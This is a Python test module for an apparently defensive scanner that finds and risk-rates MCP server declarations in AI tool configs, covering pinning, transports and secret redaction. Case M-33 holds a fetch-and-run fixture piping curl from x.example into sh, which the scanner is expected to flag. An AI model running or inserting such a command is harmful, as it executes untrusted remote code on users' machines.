"""Group M - MCP servers. Every place one can be declared, every field about it,
the supply-chain verdict, and what must not be counted as a server."""

from .framework import World, assets, findings, has

SRV = {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github@1.4.2"]}
DESKTOP_MAC = "~/Library/Application Support/Claude/claude_desktop_config.json"

CASES = {}


def case(case_id):
    def register(fn):
        CASES[case_id] = fn
        return fn
    return register


def servers(snapshot):
    return assets(snapshot, kind="mcp_server")


def server(snapshot, name=None):
    matches = servers(snapshot)
    if name:
        matches = [a for a in matches if a.name == name]
    if len(matches) != 1:
        raise AssertionError("expected 1 server%s, got %d: %s"
                             % (" named " + name if name else "", len(matches),
                                [a.name for a in matches]))
    return matches[0]


def one_server(name=None, **fields):
    def check(snapshot):
        asset = server(snapshot, name)
        for key, value in fields.items():
            if key == "factors":
                got = asset.risk.get("factors", [])
                if not set(value).issubset(set(got)):
                    return "factors %r, expected to contain %r" % (got, value)
                continue
            if key == "not_factors":
                got = asset.risk.get("factors", [])
                if set(value) & set(got):
                    return "unwanted factors present: %r" % got
                continue
            got = {"channels": asset.channels, "pinned": asset.risk.get("pinned"),
                   "enabled": asset.risk.get("enabled"),
                   "scope": asset.config_scope}.get(key, getattr(asset, key, None))
            if got != value:
                return "%s == %r, expected %r" % (key, got, value)
        return True
    return has("one server %s %s" % (name or "", fields), check)


def n_servers(n):
    return has("%d mcp servers" % n,
               lambda s: len(servers(s)) == n or "got %d: %s" % (len(servers(s)),
                                                                [a.name for a in servers(s)]))


def finding_count(kind, n):
    return has("%d %s findings" % (n, kind),
               lambda s: len(findings(s, kind)) == n or "got %s" % findings(s, kind))


# -- M.1 every place a server can be declared -----------------------------

@case("M-01")
def m01():
    w = World().json("~/.claude.json", {"mcpServers": {"github": SRV}})
    return w, [one_server("github", transport="stdio", scope="user", pinned=True),
               has("matched on claude-code config",
                   lambda s: server(s).evidence[0].matched_on == "config:claude-code")]


@case("M-02")
def m02():
    w = World().json("~/dev/payments/.mcp.json",
                     {"mcpServers": {"db": {"command": "node", "args": ["db.js"]}}})
    return w, [one_server("db", scope="project"),
               has("install path is the project config",
                   lambda s: server(s).install_path.endswith("/dev/payments/.mcp.json"))]


@case("M-03")
def m03():
    w = World()
    w.json("~/dev/payments/.mcp.json", {"mcpServers": {
        "a": {"command": "node", "args": ["a.js"]},
        "b": {"command": "node", "args": ["b.js"]},
        "c": {"command": "node", "args": ["c.js"]}}})
    w.json("~/dev/payments/.claude/settings.json", {"enabledMcpjsonServers": ["a"]})
    return w, [n_servers(3),
               has("only the approved one is enabled",
                   lambda s: sorted((a.name, a.risk.get("enabled")) for a in servers(s))
                   == [("a", True), ("b", False), ("c", False)])]


@case("M-04")
def m04():
    w = World().json(DESKTOP_MAC, {"mcpServers": {"github": SRV}})
    return w, [one_server("github"),
               has("matched on claude-desktop",
                   lambda s: server(s).evidence[0].matched_on == "config:claude-desktop")]


@case("M-05")
def m05():
    win = World(platform="windows")
    win.json("%APPDATA%/Claude/claude_desktop_config.json", {"mcpServers": {"github": SRV}})
    linux = World(platform="linux")
    linux.json("~/.config/claude-desktop/claude_desktop_config.json", {"mcpServers": {"github": SRV}})
    return linux, [one_server("github"),
                   has("also found on windows at the roaming path",
                       lambda s: len(servers(win.scan())) == 1)]


@case("M-06")
def m06():
    w = World().json("~/.cursor/mcp.json", {"mcpServers": {"a": SRV}})
    w.json("~/dev/payments/.cursor/mcp.json", {"mcpServers": {"b": {"command": "node", "args": ["b.js"]}}})
    return w, [n_servers(2),
               has("scopes are user and project",
                   lambda s: sorted(a.config_scope for a in servers(s)) == ["project", "user"])]


@case("M-07")
def m07():
    w = World().json("~/.codeium/windsurf/mcp_config.json",
                     {"mcpServers": {"a": SRV, "b": {"command": "node", "args": ["b.js"]}}})
    return w, [n_servers(2),
               has("matched on windsurf",
                   lambda s: all(e.matched_on == "config:windsurf"
                                 for a in servers(s) for e in a.evidence))]


@case("M-08")
def m08():
    w = World().json("~/Library/Application Support/Code/User/mcp.json", {"servers": {"a": SRV}})
    w.json("~/dev/payments/.vscode/mcp.json", {"servers": {"b": {"command": "node", "args": ["b.js"]}}})
    return w, [n_servers(2),
               has("scopes are user and project",
                   lambda s: sorted(a.config_scope for a in servers(s)) == ["project", "user"])]


@case("M-09")
def m09():
    w = World().json("~/Library/Application Support/Zed/settings.json",
                     {"theme": "One Dark", "context_servers": {"a": SRV}})
    return w, [n_servers(1),
               has("editor settings are not captured",
                   lambda s: "One Dark" not in s.to_json())]


@case("M-10")
def m10():
    w = World().file("~/.codex/config.toml", """
[mcp_servers.git]
command = "uvx"
args = ["mcp-server-git", "--repo", "/Users/alice/dev/x"]

[mcp_servers.git.env]
GIT_TOKEN = "secret-value"
""")
    return w, [one_server("git"),
               has("args parsed as three", lambda s: len(server(s).risk.get("args", [])) == 3),
               has("env names kept, value dropped",
                   lambda s: server(s).risk.get("env_names") == ["GIT_TOKEN"]
                   and "secret-value" not in s.to_json())]


@case("M-11")
def m11():
    w = World().file("~/.config/goose/config.yaml", """
extensions:
  developer:
    command: goose-mcp
    args: [developer]
  github:
    command: npx
    args: [-y, server-github]
""")
    return w, [n_servers(2)]


@case("M-12")
def m12():
    w = World().json("~/Library/Application Support/Code/User/globalStorage/"
                     "saoudrizwan.claude-dev/settings/cline_mcp_settings.json",
                     {"mcpServers": {"a": SRV, "b": {"command": "node", "args": ["b.js"]}}})
    return w, [n_servers(2),
               has("host app is cline",
                   lambda s: all("cline" in e.matched_on for a in servers(s) for e in a.evidence))]


@case("M-13")
def m13():
    w = World().json("~/Library/Application Support/JetBrains/options/mcp.json",
                     {"mcpServers": {"a": SRV}})
    return w, [n_servers(1)]


@case("M-14")
def m14():
    mac = World().json("/Library/Application Support/ClaudeCode/managed-settings.json",
                       {"mcpServers": {"corp": SRV}})
    linux = World(platform="linux").json("/etc/claude-code/managed-settings.json",
                                         {"mcpServers": {"corp": SRV}})
    win = World(platform="windows").json("C:/Program Files/ClaudeCode/managed-settings.json",
                                         {"mcpServers": {"corp": SRV}})
    return mac, [one_server("corp", scope="enterprise_managed"),
                 has("found on linux too",
                     lambda s: server(linux.scan()).config_scope == "enterprise_managed"),
                 has("found on windows too",
                     lambda s: server(win.scan()).config_scope == "enterprise_managed")]


@case("M-15")
def m15():
    mac = World(preferences={"com.anthropic.claudecode": {"mcpServers": {"corp": SRV}}})
    win = World(platform="windows")
    win.reg(Key="HKLM\\SOFTWARE\\Policies\\ClaudeCode",
            Settings='{"mcpServers": {"corp": {"command": "npx", "args": ["-y", "pkg@1.0.0"]}}}')
    return mac, [one_server("corp", scope="enterprise_managed"),
                 has("source recorded as mdm",
                     lambda s: server(s).risk.get("source") == "mdm"
                     or any(e.path.startswith("defaults:") for e in server(s).evidence)),
                 has("windows policy key parsed too",
                     lambda s: server(win.scan(), "corp").config_scope == "enterprise_managed")]


@case("M-16")
def m16():
    w = World().json("~/Library/Application Support/Claude/Claude Extensions/acme-tools/manifest.json",
                     {"name": "acme-tools", "version": "1.2.0",
                      "server": {"command": "node", "args": ["server.js"]}})
    return w, [one_server("acme-tools", install_method="mcpb", version="1.2.0",
                          factors=["unsigned_bundle"])]


@case("M-17")
def m17():
    w = World().json("~/.claude.json", {"mcpServers": {"gateway": {
        "command": "docker", "args": ["run", "--rm", "docker/mcp-gateway:1.2.0"]}}})
    return w, [one_server("gateway", factors=["aggregator"])]


@case("M-18")
def m18():
    w = World().path("/opt/homebrew/bin")
    w.file("/opt/homebrew/bin/claude").file("/opt/homebrew/bin/npx")
    w.proc(1, "/opt/homebrew/bin/claude")
    w.proc(2, "/opt/homebrew/bin/npx", argv=["npx", "-y", "mcp-server-github"], ppid=1)
    return w, [one_server(channels=["runtime"], parent_agent="claude-code"),
               finding_count("undeclared_mcp_server", 1)]


@case("M-19")
def m19():
    w = World().path("/opt/homebrew/bin")
    w.file("/opt/homebrew/bin/claude").file("/opt/homebrew/bin/npx")
    w.json("~/.claude.json", {"mcpServers": {
        "declared": {"command": "node", "args": ["declared.js"]},
        "both": {"command": "npx", "args": ["-y", "server-both@1.0.0"]}}})
    w.proc(1, "/opt/homebrew/bin/claude")
    w.proc(2, "/opt/homebrew/bin/npx", argv=["npx", "-y", "server-both@1.0.0"], ppid=1)
    w.proc(3, "/opt/homebrew/bin/npx", argv=["npx", "-y", "mcp-rogue"], ppid=1)
    return w, [n_servers(3),
               has("channels per server",
                   lambda s: sorted((a.name, tuple(a.channels)) for a in servers(s))
                   # The declared name wins over one derived from argv: a
                   # config says what a server is called, a command line only
                   # says what it launches.
                   == [("both", ("config", "runtime")), ("declared", ("config",)),
                       ("mcp-rogue", ("runtime",))]),
               finding_count("undeclared_mcp_server", 1)]


@case("M-20")
def m20():
    w = World().json("~/.claude.json",
                     {"mcpServers": {"internal": {"command": "/opt/nonexistent/srv"}}})
    return w, [one_server("internal", liveness="declared_only", flags=["command_missing"])]


# -- M.2 transport and connection -----------------------------------------

@case("M-21")
def m21():
    w = World().json("~/.claude.json", {"mcpServers": {
        "a": {"command": "node", "args": ["a.js"]},
        "b": {"url": "https://x.example/mcp"},
        "c": {"type": "sse", "url": "https://y.example/sse"}}})
    return w, [n_servers(3),
               has("transports are stdio, http and sse",
                   lambda s: sorted(a.transport for a in servers(s)) == ["http", "sse", "stdio"]),
               has("sse carries the deprecated-transport factor",
                   lambda s: "deprecated_transport" in
                   [a for a in servers(s) if a.transport == "sse"][0].risk["factors"])]


@case("M-22")
def m22():
    w = World().json("~/.claude.json", {"mcpServers": {
        "plain": {"url": "http://vendor.example/mcp"},
        "tls": {"url": "https://vendor.example/mcp"}}})
    return w, [one_server("plain", factors=["plaintext_remote"], install_method="remote"),
               one_server("tls", not_factors=["plaintext_remote"], pinned=True)]


@case("M-23")
def m23():
    w = World(policy={"corporate_domains": ["corp.example"]})
    w.json("~/.claude.json", {"mcpServers": {
        "inside": {"url": "https://mcp.corp.example/v1"},
        "outside": {"url": "https://mcp.random-vendor.io/v1"}}})
    return w, [one_server("outside", factors=["third_party_remote"]),
               one_server("inside", not_factors=["third_party_remote"])]


@case("M-24")
def m24():
    w = World().json("~/.claude.json", {"mcpServers": {"remote": {"url": "https://x.example/mcp"}}})
    w.file("~/.claude/.credentials.json", '{"claudeAiOauth": {"accessToken": "oauth-CANARY"}}')
    return w, [has("stored credential recorded, value never",
                   lambda s: server(s, "remote").risk.get("stored_credential") is True
                   and "oauth-CANARY" not in s.to_json())]


@case("M-25")
def m25():
    w = World().json("~/.claude.json",
                     {"mcpServers": {"r": {"url": "https://x.example/mcp/v1?token=CANARYTOK"}}})
    return w, [has("endpoint keeps host and path, drops the query",
                   lambda s: server(s).network.get("endpoint") == "https://x.example/mcp/v1"),
               has("token absent", lambda s: "CANARYTOK" not in s.to_json())]


# -- M.3 supply-chain verdict ---------------------------------------------

def launch(name, spec):
    w = World().json("~/.claude.json", {"mcpServers": {name: spec}})
    return w


@case("M-26")
def m26():
    w = launch("gh", {"command": "npx", "args": ["-y", "server-github"]})
    return w, [one_server("gh", pinned=False, install_method="npm-ephemeral",
                          factors=["unpinned_supply_chain"]),
               finding_count("unpinned_mcp_server", 1)]


@case("M-27")
def m27():
    w = launch("gh", {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github@1.4.2"]})
    return w, [one_server("gh", pinned=True), finding_count("unpinned_mcp_server", 0)]


@case("M-28")
def m28():
    w = launch("gh", {"command": "npx", "args": ["-y", "server-github@^1.4.0"]})
    return w, [one_server("gh", pinned=False, factors=["floating_range"])]


@case("M-29")
def m29():
    w = World().json("~/.claude.json", {"mcpServers": {
        "a": {"command": "uvx", "args": ["mcp-server-git"]},
        "b": {"command": "pipx", "args": ["run", "mcp-thing"]},
        "c": {"command": "bunx", "args": ["mcp-other"]}}})
    return w, [has("all three unpinned with the right method",
                   lambda s: sorted((a.name, a.risk["pinned"], a.install_method) for a in servers(s))
                   == [("a", False, "pypi-ephemeral"), ("b", False, "pypi-ephemeral"),
                       ("c", False, "npm-ephemeral")])]


@case("M-30")
def m30():
    w = World().json("~/.claude.json", {"mcpServers": {
        "tag": {"command": "docker", "args": ["run", "--rm", "ghcr.io/x/mcp:latest"]},
        "digest": {"command": "docker", "args": ["run", "--rm", "ghcr.io/x/mcp@sha256:ab34cd"]}}})
    return w, [one_server("tag", pinned=False, install_method="container",
                          factors=["unpinned_supply_chain"]),
               one_server("digest", pinned=True, install_method="container")]


@case("M-31")
def m31():
    w = launch("g", {"command": "npx", "args": ["-y", "github:someone/mcp-server"]})
    return w, [one_server("g", pinned=False, factors=["unpinned_supply_chain", "vcs_source"])]


@case("M-32")
def m32():
    w = launch("local", {"command": "node", "args": ["/Users/alice/dev/tools/server.js"]})
    return w, [one_server("local", pinned=True),
               has("script path recorded",
                   lambda s: "/Users/alice/dev/tools/server.js" in server(s).risk.get("args", []))]


@case("M-33")
def m33():
    w = launch("shell", {"command": "bash", "args": ["-c", "curl -s https://x.example/s.sh | sh"]})
    return w, [one_server("shell", factors=["remote_code_execution"])]


# -- M.4 what the server can reach ----------------------------------------

@case("M-34")
def m34():
    w = launch("s", {"command": "node", "args": ["s.js"],
                     "env": {"ANTHROPIC_API_KEY": "sk-ant-CANARY", "HTTP_PROXY": "http://p:3128"}})
    return w, [has("names kept, kinds derived, value gone",
                   lambda s: server(s).risk.get("env_names") == ["ANTHROPIC_API_KEY", "HTTP_PROXY"]
                   and server(s).risk.get("credential_kinds") == ["anthropic"]
                   and "sk-ant-CANARY" not in s.to_json())]


@case("M-35")
def m35():
    w = launch("fs", {"command": "npx", "args": ["-y", "server-filesystem@1.0.0", "/"]})
    return w, [one_server("fs", factors=["broad_filesystem_scope"]),
               has("granted path recorded", lambda s: "/" in server(s).risk.get("args", []))]


@case("M-36")
def m36():
    w = launch("s", {"command": "node", "args": ["s.js"]})
    return w, [one_server("s", factors=["inherits_environment"])]


@case("M-37")
def m37():
    w = World()
    w.json("~/.claude.json", {"mcpServers": {"gh": {"command": "node", "args": ["user.js"]}}})
    w.json("~/dev/payments/.mcp.json", {"mcpServers": {"gh": {"command": "node", "args": ["project.js"]}}})
    w.json("/Library/Application Support/ClaudeCode/managed-settings.json",
           {"mcpServers": {"gh": {"command": "node", "args": ["managed.js"]}}})
    return w, [n_servers(3),
               has("the managed one is effective",
                   lambda s: [a.config_scope for a in servers(s) if a.risk.get("effective")]
                   == ["enterprise_managed"])]


# -- M.5 counting, and what is not a server -------------------------------

@case("M-38")
def m38():
    w = World()
    for path in ("~/.claude.json", "~/.cursor/mcp.json", DESKTOP_MAC):
        w.json(path, {"mcpServers": {"github": SRV}})
    return w, [n_servers(1),
               has("three evidence rows, three paths",
                   lambda s: len({e.path for e in server(s).evidence}) == 3)]


@case("M-39")
def m39():
    w = World()
    w.json("~/.claude.json", {"mcpServers": {"github": {"command": "npx", "args": ["-y", "pkg-a@1.0.0"]}}})
    w.json("~/.cursor/mcp.json", {"mcpServers": {"github": {"command": "npx", "args": ["-y", "pkg-b@1.0.0"]}}})
    return w, [n_servers(2)]


@case("M-40")
def m40():
    w = World().path("/opt/homebrew/bin")
    w.file("/opt/homebrew/bin/claude").file("/opt/homebrew/bin/npx")
    w.json("~/.claude.json", {"mcpServers": {"gh": {"command": "npx", "args": ["-y", "server-gh@1.0.0"]}}})
    w.proc(1, "/opt/homebrew/bin/claude")
    w.proc(2, "/opt/homebrew/bin/npx", argv=["npx", "-y", "server-gh@1.0.0"], ppid=1)
    return w, [n_servers(1), one_server(channels=["config", "runtime"])]


@case("M-41")
def m41():
    w = World().path("/opt/homebrew/bin")
    for name in ("claude", "cursor-agent", "npx"):
        w.file("/opt/homebrew/bin/%s" % name)
    w.proc(1, "/opt/homebrew/bin/claude")
    w.proc(2, "/opt/homebrew/bin/cursor-agent")
    w.proc(3, "/opt/homebrew/bin/npx", argv=["npx", "-y", "mcp-shared"], ppid=1)
    w.proc(4, "/opt/homebrew/bin/npx", argv=["npx", "-y", "mcp-shared"], ppid=2)
    return w, [n_servers(1),
               has("both parent agents recorded",
                   lambda s: sorted(server(s).risk.get("parent_agents", []))
                   == ["claude-code", "cursor"])]


@case("M-42")
def m42():
    w = World().path("/opt/homebrew/bin")
    w.file("/opt/homebrew/bin/claude")
    w.proc(1, "/opt/homebrew/bin/claude")
    w.proc(2, "/bin/bash", argv=["bash", "-c", "make test"], ppid=1)
    w.proc(3, "/opt/homebrew/bin/rg", argv=["rg", "--json", "pattern"], ppid=1)
    w.proc(4, "/opt/homebrew/bin/node", argv=["node", "build.js"], ppid=1)
    return w, [n_servers(0), finding_count("undeclared_mcp_server", 0)]


@case("M-43")
def m43():
    w = World().dir("~/.cursor")
    w.json("~/.cursor/mcp.json", {"mcpServers": {}})
    w.json("~/Library/Application Support/Code/User/mcp.json", {"other": {}})
    return w, [n_servers(0), has("no errors", lambda s: s.errors == [] or s.errors)]


@case("M-44")
def m44():
    w = World().file("~/.claude.json", """
{
  "mcpServers": {
    // "disabled-by-comment": {"command": "node", "args": ["x.js"]},
    "live": {"command": "node", "args": ["live.js"]}
  }
}
""")
    return w, [n_servers(1), one_server("live")]


@case("M-45")
def m45():
    w = World().file("~/dev/notes/mcp-setup.md", """
Add this to your config:
```json
{"mcpServers": {"a": {"command": "npx"}, "b": {"command": "npx"}}}
```
""")
    return w, [n_servers(0)]


@case("M-46")
def m46():
    w = launch("off", {"command": "node", "args": ["x.js"], "disabled": True})
    return w, [one_server("off", enabled=False)]
